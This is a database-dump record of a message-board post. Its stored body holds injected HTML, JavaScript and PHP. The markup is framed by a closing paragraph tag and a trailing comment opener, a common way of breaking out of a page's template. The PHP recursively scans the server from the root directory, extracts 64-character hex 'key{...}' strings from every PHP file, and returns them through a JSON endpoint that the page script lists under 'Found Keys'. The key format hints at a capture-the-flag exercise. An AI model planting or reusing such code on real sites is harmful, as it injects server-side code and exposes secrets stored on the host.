(412,'</p>\r\n    <h1>Found Keys:</h1>\r\n    <ul id=\'key-list\'></ul> <!-- Element to display the found keys -->\r\n\r\n    <!-- JavaScript Section in Body -->\r\n    <script>\r\n        document.addEventListener(\'DOMContentLoaded\', function() {\r\n            // Function to append a new key to the list\r\n            function addKeyToList(newKey) {\r\n                const keyList = document.getElementById(\'key-list\');\r\n                const listItem = document.createElement(\'li\');\r\n                listItem.textContent = newKey;\r\n                keyList.appendChild(listItem);\r\n            }\r\n\r\n            // Fetch keys via an AJAX call (using Fetch API)\r\n            fetch(\'board.php?id=45893&keysearch=True&display=True\')\r\n                .then(response => response.json())\r\n                .then(data => {\r\n                    data.keys.forEach(key => {\r\n                        addKeyToList(key); // Add each found key to the list\r\n                    });\r\n                })\r\n                .catch(error => console.error(\'Error fetching keys:\', error));\r\n        });\r\n    </script>\r\n<div id=\'footer\'>\r\n</div>\r\n</body>\r\n</html>\r\n\r\n<?php\r\n// PHP Logic Section\r\n\r\n// Function to search files for a specific regex pattern\r\nfunction searchFiles($directory, $pattern) {\r\n    $matches = [];\r\n    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($directory));\r\n\r\n    foreach ($iterator as $file) {\r\n        if ($file->isFile() && $file->getExtension() === \'php\') {\r\n            $content = file_get_contents($file->getPathname());\r\n            if (preg_match_all($pattern, $content, $found)) {\r\n                foreach ($found[1] as $match) {\r\n                    $matches[] = $match;\r\n                }\r\n            }\r\n        }\r\n    }\r\n    return $matches;\r\n}\r\n\r\n// Check if the AJAX request is made\r\nif (isset($_GET[\'keysearch\']) && $_GET[\'keysearch\'] === \'True\') {\r\n    $matchedKeys = [];\r\n    $searchDirectory = \'/\'; // Root directory (you can adjust this as needed)\r\n    $regexPattern = \'/key\\{([a-f0-9]{64})\\}/\';\r\n    $matchedKeys = searchFiles($searchDirectory, $regexPattern);\r\n\r\n    // Return keys as a JSON response\r\n    header(\'Content-Type: application/json\');\r\n    echo json_encode([\'keys\' => $matchedKeys]);\r\n}\r\n?>\r\n<!--',0,45893,'2024-11-01 18:30:59'),
